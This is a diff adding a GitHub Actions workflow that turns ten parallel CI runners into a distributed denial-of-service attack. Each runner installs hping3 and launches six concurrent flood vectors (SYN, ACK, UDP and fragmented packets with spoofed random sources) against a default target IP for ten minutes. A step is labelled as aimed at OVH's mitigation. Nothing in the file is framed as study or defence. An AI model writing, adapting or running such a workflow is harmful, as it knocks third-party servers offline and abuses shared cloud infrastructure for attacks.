@@ -1,0 +1,31 @@
+name: l4v
+on:
+  workflow_dispatch:
+    inputs:
+      target: { default: '57.131.163.31' }
+      seconds: { default: '600' }
+jobs:
+  l4:
+    strategy:
+      fail-fast: false
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10]
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - name: install
+        run: sudo apt-get update -qq >/dev/null 2>&1; sudo apt-get install -y -qq hping3 >/dev/null 2>&1; which hping3
+      - name: ovh 6-vector frag flood
+        run: |
+          T=${{ inputs.target }}; S=${{ inputs.seconds }}
+          echo "runner=${{ matrix.n }} egress=$(curl -s --max-time 5 https://api.ipify.org)"
+          sleep ${{ matrix.n }}
+          P=$(( (RANDOM % 40000) + 10000 )); L=$(( (RANDOM % 1364) + 36 ))
+          sudo timeout -s INT $S hping3 --flood -S -p 443 -f -d 1400 --rand-source --id $((RANDOM%65535)) $T >/tmp/v1 2>&1 &
+          sudo timeout -s INT $S hping3 --flood -S -p 80 -d $L --rand-source --id $((RANDOM%65535)) $T >/tmp/v2 2>&1 &
+          sudo timeout -s INT $S hping3 --flood -A -p 443 -f -d 1400 --rand-source --id $((RANDOM%65535)) $T >/tmp/v3 2>&1 &
+          sudo timeout -s INT $S hping3 --flood --udp -p 443 -d $L --rand-source --id $((RANDOM%65535)) $T >/tmp/v4 2>&1 &
+          sudo timeout -s INT $S hping3 --flood -S -p $P -f -d 1400 --rand-source --id $((RANDOM%65535)) $T >/tmp/v5 2>&1 &
+          sudo timeout -s INT $S hping3 --flood -A -p $((P+1)) -d 64 --rand-source --id $((RANDOM%65535)) $T >/tmp/v6 2>&1 &
+          wait
+          for f in /tmp/v1 /tmp/v2 /tmp/v3 /tmp/v4 /tmp/v5 /tmp/v6; do grep -aoE '[0-9]+ packets transmitted' $f | head -1; done
